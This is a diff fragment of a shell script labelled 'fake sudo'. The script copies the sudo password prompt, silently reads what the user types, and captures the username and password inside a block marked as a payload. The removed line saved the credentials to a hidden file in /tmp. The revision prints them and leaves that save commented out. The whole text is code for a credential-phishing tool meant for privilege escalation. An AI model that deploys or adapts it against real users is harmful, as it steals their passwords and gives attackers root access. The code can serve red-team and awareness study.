@@ -6,7 +6,6 @@
 # done
 # echo ""
 # echo "python /tmp/sudo.py $i"
-echo "Running fake sudo"
 if [ -z "${SUDO_PROMPT}" ]; then
     readonly INPUT_MESSAGE="[sudo] password for ${USER}: "
 else
@@ -17,6 +16,7 @@ readonly MAXIMUM_ATTEMPTS=3
 readonly ERROR_MESSAGE="sudo: ${MAXIMUM_ATTEMPTS} incorrect password attempts"
 
 attempts() {
+    echo "Running fake sudo"
     /bin/echo -n "${INPUT_MESSAGE}"
     read -r -s sudo_password
     /bin/echo ""
@@ -24,7 +24,8 @@ attempts() {
         ##
         # <YOUR-PAYLOAD>
         ##
-        /bin/echo "${USER}:${sudo_password}" > /tmp/.sudo_password
+        /bin/echo "${USER}:${sudo_password}"
+        # /bin/echo "${USER}:${sudo_password}" > /tmp/.sudo_password
         ##
         # </YOUR-PAYLOAD>
         ##
